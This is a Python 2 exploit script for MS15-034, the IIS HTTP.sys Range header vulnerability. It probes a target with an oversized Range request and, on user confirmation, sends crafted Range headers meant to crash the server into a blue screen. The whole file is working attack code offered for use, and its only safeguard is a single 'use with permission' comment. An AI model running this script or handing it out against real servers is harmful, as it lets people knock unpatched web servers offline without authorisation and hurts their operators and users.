#!/usr/bin/python
# Exploit MS15-034 like a boss. USE WITH PERMISSION AND CAUTION!!!

import socket
import sys
import argparse
from urlparse import urlparse


# This is the generic socket object that sends the exploit
def exploit(payload, victim):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((victim, 80))
    s.send(payload)
    resp = s.recv(1024)
    s.close()
    return resp


# This function takes down a vulnerable server.
def takedown(vic, req):
    if not req:
        req = "/"
    for i in range(18, 25):
        # iterate through a range from 18-25 to actually exploit the vuln with extreme prejudice
        nosebleed = "GET %s HTTP/1.1\r\nHost: %s\r\nRange: bytes=%s-18446744073709551615\r\n\r\n" % (req, vic, str(i))
        #print nosebleed
        res = exploit(nosebleed, vic)
        print res


def knock(vic, req):
    if not req:
        req = "/"
    knockknock = "GET %s HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n" % (req, vic)
    whosthere = exploit(knockknock, vic)
    return whosthere


if __name__ == "__main__":
    # Setup argparse
    parser = argparse.ArgumentParser(description='Scan for and exploit MS15-034 codenamed nosebleed',
                                     usage='%(prog)s -t http://target.com/cgi-bin/login OR '
                                           '%(prog)s -i 1.2.3.4 ')
    parser.add_argument('-t', '--target', dest='tgt', help="Full URL to test. This will provide best results")
    parser.add_argument('-i', '--ip', dest='ip', help="Single IP to test. Results may vary")
    args = parser.parse_args()

    ipaddr = False
    url = False

    # Handle args
    if args.tgt:
        target_info = urlparse(args.tgt)
        target = target_info.netloc
        path = target_info.path
        print "Hitting: %s" % target
        print "Path: %s" % path
        url = True
    elif args.ip:
        try:
            socket.inet_aton(args.ip)
            target = args.ip
            print "Hitting: %s" % target
            ipaddr = True
        except socket.error:
            print("Invalid IP!! Try again...")
            sys.exit()
    else:
        print("You need to specify a target url with '-t' or an IP address with '-i'!! Exiting....")
        parser.print_help()
        sys.exit()

    # Check for the vulnerability and exploit it if you wish
    if url:
        check = knock(target, path)
    elif ipaddr:
        check = knock(target, None)
    # print check
    if "requested range not satisfiable" in check.lower():
        doit = raw_input("They're vulnerable! Paint the window a pretty blue!?")
        if "y" in doit.lower():
            print("[+] Get ready for the boomsauce!")
            if url:
                takedown(target, path)
            elif ipaddr:
                takedown(target, None)
        else:
            print("How nice of you to spare them! :)")
            sys.exit()
    elif "the request has an invalid header name" in check.lower():
        print("Looks like their sysadmins and security team are on top of it! It's patched!")
        sys.exit()
    elif "microsoft" not in check.lower():
        print("This is either not an IIS server or something went wrong")
        sys.exit()




